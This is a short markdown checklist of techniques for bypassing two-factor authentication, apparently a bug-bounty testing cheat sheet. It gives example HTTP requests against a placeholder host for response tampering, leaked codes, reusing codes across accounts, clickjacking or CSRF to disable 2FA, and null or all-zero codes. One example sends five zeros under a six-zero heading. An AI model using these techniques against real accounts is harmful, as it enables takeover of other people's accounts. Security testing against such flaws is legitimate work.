# Bypass Two-Factor Authentication

1. Response manipulation

The response is
```
HTTP/1.1 404 Not Found
...
{"code": false}
```
Try this to bypass
```
HTTP/1.1 404 Not Found
...
{"code": true}
```

2. Status code manipulation

The response is
```
HTTP/1.1 404 Not Found
...
{"code": false}
```
Try this to bypass
```
HTTP/1.1 200 OK
...
{"code": false}
```

3. 2FA Code in Response

Always check the response!
```
POST /req-2fa/
Host: vuln.com
...
email=victim@gmail.com
```
The response is
```
HTTP/1.1 200 OK
...
{"email": "victim@gmail.com", "code": "101010"}
```

4. JS Files may contain info about the 2FA Code (Rare case)
   
5. Bruteforce the 2FA code
   
6. Missing 2FA Code integrity validation, code for any user account can be used
```
POST /2fa/
Host: vuln.com
...
email=attacker@gmail.com&code=382923
```
```
POST /2fa/
Host: vuln.com
...
email=victim@gmail.com&code=382923
```
   
7. No CSRF protection on disabling 2FA, also there is no auth confirmation.

8. 2FA gets disabled on password change/email change. 

9. Clickjacking on 2FA disabling page, by iframing the 2FA Disabling page and lure the victim to disable the 2FA. 
    
10. Enabling 2FA doesn't expire previously active sessions, if the session is already hijacked and there is a session timeout vuln.

11. 2FA code reusability, same code can be reused.

12. Enter code 000000
```
POST /2fa/
Host: vuln.com
...
code=00000
```

13. Enter code "null"
```
POST /2fa/
Host: vuln.com
...
code=null
```

## References
* [Harsh Bothra](https://twitter.com/harshbothra_)
* Other writeup